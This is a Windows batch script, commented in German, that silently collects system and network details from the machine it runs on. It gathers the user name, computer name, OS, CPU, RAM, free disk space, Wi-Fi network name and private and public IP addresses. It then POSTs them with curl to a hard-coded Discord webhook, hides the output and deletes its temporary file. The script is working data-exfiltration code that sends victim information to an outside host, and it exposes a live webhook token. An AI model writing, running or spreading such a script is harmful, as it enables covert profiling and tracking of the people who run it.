@echo off
setlocal enabledelayedexpansion

:: --- CONFIG ---
set "URL=https://discord.com/api/webhooks/1484859436882464790/ptBp1GBI3AHRfQbFl9fzG-pEPGwpeahk8L6BFJOdf-T5SxqHFvaV9LNfRrIgTSi7F2DY"

:: --- INFOS SAMMELN ---
:: System & User
set "PC_NAME=%COMPUTERNAME%"
set "USER_NAME=%USERNAME%"
for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value') do set "OS_NAME=%%a"

:: CPU Info
for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do set "CPU_NAME=%%a"

:: RAM Info (Grob in GB umgerechnet)
for /f "tokens=2 delims==" %%a in ('wmic computersystem get totalphysicalmemory /value') do set "RAM_RAW=%%a"
set /a RAM_GB=%RAM_RAW:~0,-7% / 107 2>nul

:: Freier Speicher auf C: (in GB)
for /f "tokens=2 delims==" %%a in ('wmic logicaldisk where "DeviceID='C:'" get FreeSpace /value') do set "DISK_RAW=%%a"
set /a DISK_FREE=%DISK_RAW:~0,-7% / 107 2>nul

:: WLAN SSID (falls verbunden)
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /c:" SSID"') do set "WLAN_NAME=%%a"
set "WLAN_NAME=%WLAN_NAME:~1%"

:: IPs (Deine bewährten Methoden)
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (set "IP_RAW=%%a" & set "PRIVATE_IP=!IP_RAW:~1!" & goto :next)
:next
for /f "tokens=2" %%a in ('nslookup myip.opendns.com resolver1.opendns.com ^| find /i "Address"') do set "PUBLIC_IP=%%a"

:: --- JSON PAYLOAD ERSTELLEN ---
(
echo {
echo   "content": "### 📋 System Report: %PC_NAME%",
echo   "embeds": [{
echo     "color": 3447003,
echo     "fields": [
echo       {"name": "👤 User", "value": "%USER_NAME%", "inline": true},
echo       {"name": "💻 OS", "value": "%OS_NAME%", "inline": true},
echo       {"name": "⚙️ CPU", "value": "%CPU_NAME%"},
echo       {"name": "📊 RAM", "value": "~%RAM_GB% GB", "inline": true},
echo       {"name": "💽 Free Disk (C:)", "value": "%DISK_FREE% GB", "inline": true},
echo       {"name": "🌐 Public IP", "value": "%PUBLIC_IP%", "inline": true},
echo       {"name": "🏠 Private IP", "value": "%PRIVATE_IP%", "inline": true},
echo       {"name": "📡 Wi-Fi", "value": "%WLAN_NAME%", "inline": true}
echo     ],
echo     "footer": {"text": "Gesendet am %date% um %time%"}
echo   }]
echo }
) > "%temp%\payload.json"

:: --- SENDEN & EXIT ---
curl -H "Content-Type: application/json" -X POST -d @%temp%\payload.json "%URL%" >nul 2>&1
if exist "%temp%\payload.json" del "%temp%\payload.json"
exit
